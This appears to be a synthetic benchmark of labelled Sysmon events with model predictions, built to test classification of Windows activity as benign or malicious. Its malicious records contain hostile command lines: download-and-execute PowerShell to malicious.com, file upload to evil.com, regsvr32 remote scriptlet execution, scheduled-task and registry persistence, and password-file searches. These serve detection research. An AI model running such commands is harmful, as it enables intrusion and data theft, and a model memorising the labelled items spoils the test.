{"EventID": 1, "EventTime": "2020-05-01 22:57:00", "UtcTime": "2020-05-01T22:57:00.000Z", "Hostname": "NEWYORK.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks /create /tn \"EdgeBrowserUpdate\" /tr \"powershell.exe -nop -w hidden -c \\\"iex((New-Object Net.WebClient).DownloadString('http://malicious.com/payload'))\\\"\" /sc daily", "ProcessId": "5876", "ProcessGUID": "{6bbf237a-16f4-5eac-16f4-0000000016f4}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "4512", "ParentProcessGUID": "{6bbf237a-11a0-5eac-11a0-0000000011a0}", "ParentCommandLine": "cmd.exe /c reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v \"CriticalUpdate\" /t REG_SZ /d \"cmd.exe /c C:\\ProgramData\\temp.bat\"", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\pbeesly\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "persistence", "_source": "llm_scenario", "prompt": "[2020-05-01 22:57:00] | PID=5876 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\schtasks.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=schtasks /create /tn \"EdgeBrowserUpdate\" /tr \"powershell.exe -nop -w hidden -c \\\"iex((New-Object Net.WebClient).DownloadString('http://malicious.com/payload'))\\\"\" /sc daily", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Scheduled task created to execute obfuscated PowerShell that downloads and executes code from a suspicious domain daily, using hidden window and no profile flags - clear persistence mechanism with command and control.", "confidence": "high", "attack_technique": "persistence"}}
{"EventID": 3, "EventTime": "2025-10-10 08:01:50", "UtcTime": "2025-10-10T08:01:50.000Z", "Hostname": "WORKSTATION-01", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\svchost.exe", "ProcessId": "1500", "ProcessGUID": "{12345678-1234-5678-1234-567812340009}", "User": "NT AUTHORITY\\SYSTEM", "IntegrityLevel": "Medium", "SourcePort": "49152", "DestinationIp": "13.107.4.52", "DestinationPort": "443", "DestinationHostname": "login.microsoftonline.com", "Protocol": "tcp", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:01:50] | PID=1500 | User=NT AUTHORITY\\SYSTEM | Image=C:\\Windows\\System32\\svchost.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Svchost.exe running as SYSTEM from the legitimate System32 directory is normal Windows service host activity with no suspicious command-line parameters or context.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:55", "UtcTime": "2020-05-01T22:56:55.000Z", "Hostname": "NEWYORK.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c bitsadmin /transfer job1 /create", "ProcessId": "1256", "ProcessGUID": "{6bbf237a-04e8-5eac-04e8-0000000004e8}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "1111", "ParentProcessGUID": "{6bbf237a-0457-5eac-0457-000000000457}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "NT AUTHORITY\\SYSTEM", "Domain": "NT AUTHORITY", "AccountName": "SYSTEM", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "data_exfiltration", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:55] | PID=1256 | User=NT AUTHORITY\\SYSTEM | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=cmd.exe /c bitsadmin /transfer job1 /create", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "SYSTEM account using cmd.exe spawned from explorer.exe to execute bitsadmin for file transfer - unusual parent-child relationship and potential abuse of BITS for download/exfiltration.", "confidence": "high", "attack_technique": "command_and_control"}}
{"EventID": 1, "EventTime": "2025-10-10 08:02:00", "UtcTime": "2025-10-10T08:02:00.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Program Files\\Microsoft VS Code\\Code.exe", "CommandLine": "C:\\Program Files\\Microsoft VS Code\\Code.exe .", "ProcessId": "1567", "ProcessGUID": "{27badde2-a0b6-f955-1b00-000000000f00}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "2048", "ParentProcessGUID": "{7acb248b-dbdc-5fbd-1100-000000000500}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "CORP\\jsmith", "Domain": "CORP", "AccountName": "jsmith", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\jsmith\\Documents\\", "LogonId": "0x3e7", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:02:00] | PID=1567 | User=CORP\\jsmith | Image=C:\\Program Files\\Microsoft VS Code\\Code.exe | Parent=C:\\Windows\\explorer.exe | CMD=C:\\Program Files\\Microsoft VS Code\\Code.exe .", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Visual Studio Code launched by Windows Explorer with normal user context - standard development environment usage.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:57:25", "UtcTime": "2020-05-01T22:57:25.000Z", "Hostname": "NEWYORK.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\powershell.exe", "CommandLine": "powershell.exe -nop -w hidden -c \"iex((New-Object Net.WebClient).DownloadString('http://malicious.com/payload'))\"", "ProcessId": "6123", "ProcessGUID": "{6bbf237a-17eb-5eac-17eb-0000000017eb}", "ParentImage": "C:\\Windows\\System32\\schtasks.exe", "ParentProcessId": "5876", "ParentProcessGUID": "{6bbf237a-16f4-5eac-16f4-0000000016f4}", "ParentCommandLine": "schtasks /create /tn \"EdgeBrowserUpdate\" /tr \"powershell.exe -nop -w hidden -c \"iex((New-Object Net.WebClient).DownloadString('http://malicious.com/payload'))\" /sc daily", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "persistence", "_source": "llm_scenario", "prompt": "[2020-05-01 22:57:25] | PID=6123 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\powershell.exe | Parent=C:\\Windows\\System32\\schtasks.exe | CMD=powershell.exe -nop -w hidden -c \"iex((New-Object Net.WebClient).DownloadString('http://malicious.com/payload'))\"", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "PowerShell launched by schtasks with hidden window, no profile, and downloading/executing remote script from suspicious domain - classic command and control pattern with fileless malware execution.", "confidence": "high", "attack_technique": "command_and_control"}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:20", "UtcTime": "2020-05-01T22:56:20.000Z", "Hostname": "UTICA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c cmdkey /list", "ProcessId": "1245", "ProcessGUID": "{6bbf237a-04dd-5eac-04dd-0000000004dd}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "1234", "ParentProcessGUID": "{6bbf237a-04d2-5eac-04d2-0000000004d2}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "NT AUTHORITY\\NETWORK SERVICE", "Domain": "NT AUTHORITY", "AccountName": "NETWORK SERVICE", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "credential_discovery", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:20] | PID=1245 | User=NT AUTHORITY\\NETWORK SERVICE | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=cmd.exe /c cmdkey /list", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "The NETWORK SERVICE account is executing cmdkey /list to enumerate stored credentials, which is unusual as this system account typically doesn't perform user credential discovery tasks. This indicates potential credential harvesting activity.", "confidence": "high", "attack_technique": "credential_discovery"}}
{"EventID": 1, "EventTime": "2020-05-01 22:57:05", "UtcTime": "2020-05-01T22:57:05.000Z", "Hostname": "NEWYORK.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -Command (New-Object Net.WebClient).UploadFile(\"http://evil.com/upload.php\", \"C:\\temp\\encoded.txt\")", "ProcessId": "1956", "ProcessGUID": "{6bbf237a-07a4-5eac-07a4-0000000007a4}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "432", "ParentProcessGUID": "{6bbf237a-01b0-5eac-01b0-0000000001b0}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "NT AUTHORITY\\NETWORK SERVICE", "Domain": "NT AUTHORITY", "AccountName": "NETWORK SERVICE", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "data_exfiltration", "_source": "llm_scenario", "prompt": "[2020-05-01 22:57:05] | PID=1956 | User=NT AUTHORITY\\NETWORK SERVICE | Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | Parent=C:\\Windows\\explorer.exe | CMD=powershell.exe -Command (New-Object Net.WebClient).UploadFile(\"http://evil.com/upload.php\", \"C:\\temp\\encoded.txt\")", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "PowerShell executing file upload to suspicious external domain (evil.com) using WebClient - clear data exfiltration attempt with unusual parent process (explorer.exe spawning PowerShell as NETWORK SERVICE).", "confidence": "high", "attack_technique": "file_exfiltration"}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:45", "UtcTime": "2020-05-01T22:56:45.000Z", "Hostname": "NEWYORK.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v \"CriticalUpdate\" /t REG_SZ /d \"cmd.exe /c C:\\ProgramData\\temp.bat\"", "ProcessId": "4512", "ProcessGUID": "{6bbf237a-11a0-5eac-11a0-0000000011a0}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "1564", "ParentProcessGUID": "{6bbf237a-061c-5eac-061c-00000000061c}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "persistence", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:45] | PID=4512 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=cmd.exe /c reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v \"CriticalUpdate\" /t REG_SZ /d \"cmd.exe /c C:\\ProgramData\\temp.bat\"", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Registry modification to add RunOnce persistence key that executes a batch file from ProgramData on next boot - classic persistence mechanism using suspicious file location.", "confidence": "high", "attack_technique": "persistence"}}
{"EventID": 1, "EventTime": "2025-10-10 08:03:30", "UtcTime": "2025-10-10T08:03:30.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\msiexec.exe", "CommandLine": "msiexec.exe /i C:\\Users\\jsmith\\Downloads\\example.msi", "ProcessId": "10123", "ProcessGUID": "{5688f3c8-2cb0-5ebd-1000-000000001400}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "2048", "ParentProcessGUID": "{7acb248b-dbdc-5ead-1000-000000000500}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "CORP\\jsmith", "Domain": "CORP", "AccountName": "jsmith", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\jsmith\\Downloads\\", "LogonId": "0x3e7", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:03:30] | PID=10123 | User=CORP\\jsmith | Image=C:\\Windows\\System32\\msiexec.exe | Parent=C:\\Windows\\explorer.exe | CMD=msiexec.exe /i C:\\Users\\jsmith\\Downloads\\example.msi", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "User executing Windows Installer (msiexec.exe) to install a software package from their Downloads folder, spawned by explorer.exe - typical legitimate software installation activity.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:45", "UtcTime": "2020-05-01T22:56:45.000Z", "Hostname": "SCRANTON.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c bitsadmin /transfer job1 /resume", "ProcessId": "5289", "ProcessGUID": "{6bbf237a-14a9-5eac-14a9-0000000014a9}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "4022", "ParentProcessGUID": "{6bbf237a-0fb6-5eac-0fb6-000000000fb6}", "ParentCommandLine": "cmd.exe /c bitsadmin /transfer job1 /addfile C:\\temp\\encoded.txt C:\\temp\\encoded.txt", "User": "NT AUTHORITY\\SYSTEM", "Domain": "NT AUTHORITY", "AccountName": "SYSTEM", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\SYSTEM\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "data_exfiltration", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:45] | PID=5289 | User=NT AUTHORITY\\SYSTEM | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=cmd.exe /c bitsadmin /transfer job1 /resume", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "SYSTEM account using bitsadmin for file transfer with incomplete command syntax, indicating potential data exfiltration or malicious payload download. Bitsadmin is commonly abused by attackers for stealthy downloads.", "confidence": "high", "attack_technique": "command_and_control"}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:20", "UtcTime": "2020-05-01T22:56:20.000Z", "Hostname": "NEWYORK.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\regsvr32.exe", "CommandLine": "regsvr32.exe /s /n /u /i:http://attacker.com/file.sct scrobj.dll", "ProcessId": "6812", "ProcessGUID": "{6bbf237a-1a9c-5eac-1a9c-000000001a9c}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "1352", "ParentProcessGUID": "{6bbf237a-0548-5eac-0548-000000000548}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "lolbin_execution", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:20] | PID=6812 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\regsvr32.exe | Parent=C:\\Windows\\explorer.exe | CMD=regsvr32.exe /s /n /u /i:http://attacker.com/file.sct scrobj.dll", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Regsvr32.exe executing with suspicious parameters including /s (silent), /u (unregister), and /i flag pointing to remote URL (http://attacker.com/file.sct) with scrobj.dll - classic \"Squiblydoo\" technique for bypassing application whitelisting and executing remote scripts.", "confidence": "high", "attack_technique": "defense_evasion"}}
{"EventID": 1, "EventTime": "2020-05-01 22:57:00", "UtcTime": "2020-05-01T22:57:00.000Z", "Hostname": "SCRANTON.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks /create /tn \"EdgeBrowserUpdate\" /tr \"powershell.exe -nop -w hidden -c \\\"(New-Object Net.WebClient).DownloadString('http://malicious.com/data') | IEX\\\"\" /sc daily", "ProcessId": "1278", "ProcessGUID": "{6bbf237a-04fe-5eac-04fe-0000000004fe}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "1267", "ParentProcessGUID": "{6bbf237a-04f3-5eac-04f3-0000000004f3}", "ParentCommandLine": "cmd.exe /c reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v WinUpdate /t REG_SZ /d \"cmd.exe /c C:\\ProgramData\\update.bat\"", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\pbeesly\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "persistence", "_source": "llm_scenario", "prompt": "[2020-05-01 22:57:00] | PID=1278 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\schtasks.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=schtasks /create /tn \"EdgeBrowserUpdate\" /tr \"powershell.exe -nop -w hidden -c \\\"(New-Object Net.WebClient).DownloadString('http://malicious.com/data') | IEX\\\"\" /sc daily", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Scheduled task creation with hidden PowerShell that downloads and executes code from a suspicious domain (malicious.com) using IEX - clear persistence mechanism with command-and-control capability.", "confidence": "high", "attack_technique": "persistence"}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:34", "UtcTime": "2020-05-01T22:56:34.000Z", "Hostname": "NEWYORK.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil -encode C:\\temp\\data.cab C:\\temp\\encoded.txt", "ProcessId": "1245", "ProcessGUID": "{6bbf237a-04dd-5eac-04dd-0000000004dd}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "1234", "ParentProcessGUID": "{6bbf237a-04d2-5eac-04d2-0000000004d2}", "ParentCommandLine": "cmd.exe /c copy C:\\Users\\Public\\Documents\\sensitive_data.txt C:\\temp\\data.cab", "User": "NT AUTHORITY\\SYSTEM", "Domain": "NT AUTHORITY", "AccountName": "SYSTEM", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\SYSTEM\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "data_exfiltration", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:34] | PID=1245 | User=NT AUTHORITY\\SYSTEM | Image=C:\\Windows\\System32\\certutil.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=certutil -encode C:\\temp\\data.cab C:\\temp\\encoded.txt", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Certutil being used to encode a CAB archive file, likely for data obfuscation or staging before exfiltration. This is a known LOTL technique where attackers abuse certutil's encoding capabilities to hide malicious payloads or exfiltrate data.", "confidence": "high", "attack_technique": "data_staging"}}
{"EventID": 1, "EventTime": "2020-05-01 22:57:15", "UtcTime": "2020-05-01T22:57:15.000Z", "Hostname": "UTICA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "dir /s /b *password*.txt", "ProcessId": "1267", "ProcessGUID": "{6bbf237a-04f3-5eac-04f3-0000000004f3}", "ParentImage": "C:\\ProgramData\\victim\\\u00e2\u20ac\u00aecod.3aka3.scr", "ParentProcessId": "2222", "ParentProcessGUID": "{6bbf237a-08ae-5eac-08ae-0000000008ae}", "ParentCommandLine": "C:\\ProgramData\\victim\\\u00e2\u20ac\u00aecod.3aka3.scr", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "credential_discovery", "_source": "llm_scenario", "prompt": "[2020-05-01 22:57:15] | PID=1267 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\ProgramData\\victim\\\u00e2\u20ac\u00aecod.3aka3.scr | CMD=dir /s /b *password*.txt", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Command searches entire system for files containing 'password' in filename, spawned from suspicious ProgramData location with obfuscated filename (right-to-left override character). This indicates credential discovery activity.", "confidence": "high", "attack_technique": "credential_discovery"}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:55", "UtcTime": "2020-05-01T22:56:55.000Z", "Hostname": "NEWYORK.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\powershell.exe", "CommandLine": "powershell Invoke-Command -ComputerName DESKTOP-TARGET -ScriptBlock {Get-Process}", "ProcessId": "1342", "ProcessGUID": "{6bbf237a-053e-5eac-053e-00000000053e}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "1284", "ParentProcessGUID": "{6bbf237a-0504-5eac-0504-000000000504}", "ParentCommandLine": "cmd.exe /c powershell Invoke-Command -ComputerName DESKTOP-TARGET -ScriptBlock {Get-Process}", "User": "NT AUTHORITY\\SYSTEM", "Domain": "NT AUTHORITY", "AccountName": "SYSTEM", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\SYSTEM\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "lateral_movement", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:55] | PID=1342 | User=NT AUTHORITY\\SYSTEM | Image=C:\\Windows\\System32\\powershell.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=powershell Invoke-Command -ComputerName DESKTOP-TARGET -ScriptBlock {Get-Process}", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "PowerShell Invoke-Command targeting remote computer DESKTOP-TARGET executed by SYSTEM account - indicates lateral movement or remote execution activity, especially suspicious when spawned from cmd.exe.", "confidence": "high", "attack_technique": "remote_execution"}}
{"EventID": 1, "EventTime": "2025-10-10 08:01:20", "UtcTime": "2025-10-10T08:01:20.000Z", "Hostname": "WORKSTATION-01", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "CommandLine": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE C:\\Users\\user\\document.docx", "ProcessId": "2005", "ProcessGUID": "{12345678-1234-5678-1234-567812340006}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "1000", "ParentProcessGUID": "{12345678-1234-5678-1234-567812340001}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "WORKSTATION\\user", "Domain": "WORKSTATION", "AccountName": "user", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\user", "LogonId": "0x1234", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:01:20] | PID=2005 | User=WORKSTATION\\user | Image=C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE | Parent=C:\\Windows\\explorer.exe | CMD=C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE C:\\Users\\user\\document.docx", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Microsoft Word launched by Windows Explorer to open a user document - standard office application usage with normal parent-child relationship.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:57:25", "UtcTime": "2020-05-01T22:57:25.000Z", "Hostname": "NEWYORK.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c bitsadmin /transfer job1 /setpriority normal", "ProcessId": "1278", "ProcessGUID": "{6bbf237a-04fe-5eac-04fe-0000000004fe}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "1111", "ParentProcessGUID": "{6bbf237a-0457-5eac-0457-000000000457}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "NT AUTHORITY\\SYSTEM", "Domain": "NT AUTHORITY", "AccountName": "SYSTEM", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "data_exfiltration", "_source": "llm_scenario", "prompt": "[2020-05-01 22:57:25] | PID=1278 | User=NT AUTHORITY\\SYSTEM | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=cmd.exe /c bitsadmin /transfer job1 /setpriority normal", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "SYSTEM account using bitsadmin for file transfer spawned from explorer.exe - highly suspicious as bitsadmin is commonly abused for downloads and SYSTEM shouldn't be performing user-initiated transfers from explorer.", "confidence": "high", "attack_technique": "command_and_control"}}
{"EventID": 1, "EventTime": "2020-05-01 22:55:56", "UtcTime": "2020-05-01T22:55:56.000Z", "Hostname": "UTICA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c where /r c:\\users *.kdbx", "ProcessId": "1700", "ProcessGUID": "{6bbf237a-06a4-5eac-06a4-0000000006a4}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "412", "ParentProcessGUID": "{6bbf237a-019c-5eac-019c-00000000019c}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "NT AUTHORITY\\SYSTEM", "Domain": "NT AUTHORITY", "AccountName": "SYSTEM", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "data_discovery", "_source": "llm_scenario", "prompt": "[2020-05-01 22:55:56] | PID=1700 | User=NT AUTHORITY\\SYSTEM | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=cmd.exe /c where /r c:\\users *.kdbx", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "SYSTEM account using cmd.exe spawned from explorer.exe to recursively search for KeePass database files (.kdbx) containing passwords - indicates credential discovery activity with suspicious process ancestry.", "confidence": "high", "attack_technique": "credential_discovery"}}
{"EventID": 1, "EventTime": "2020-05-01 22:57:01", "UtcTime": "2020-05-01T22:57:01.000Z", "Hostname": "SCRANTON.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c powershell Enter-PSSession -ComputerName DESKTOP-TARGET", "ProcessId": "3892", "ProcessGUID": "{6bbf237a-0f34-5eac-0f34-000000000f34}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "1564", "ParentProcessGUID": "{6bbf237a-061c-5eac-061c-00000000061c}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "lateral_movement", "_source": "llm_scenario", "prompt": "[2020-05-01 22:57:01] | PID=3892 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=cmd.exe /c powershell Enter-PSSession -ComputerName DESKTOP-TARGET", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Command prompt spawning PowerShell to establish a remote interactive session (Enter-PSSession) to another computer, indicating potential lateral movement activity.", "confidence": "high", "attack_technique": "lateral_movement"}}
{"EventID": 3, "EventTime": "2025-10-10 08:03:40", "UtcTime": "2025-10-10T08:03:40.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Program Files\\Microsoft Office\\Office16\\OUTLOOK.EXE", "ProcessId": "11234", "ProcessGUID": "{679904d9-2dc1-5ebe-1000-000000001500}", "User": "CORP\\jsmith", "IntegrityLevel": "Medium", "SourcePort": "54325", "DestinationIp": "104.40.215.180", "DestinationPort": "443", "DestinationHostname": "outlook.office365.com", "Protocol": "TCP", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:03:40] | PID=11234 | User=CORP\\jsmith | Image=C:\\Program Files\\Microsoft Office\\Office16\\OUTLOOK.EXE", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Microsoft Outlook running from legitimate Office installation directory - standard email client usage by corporate user.", "confidence": "high", "attack_technique": ""}}
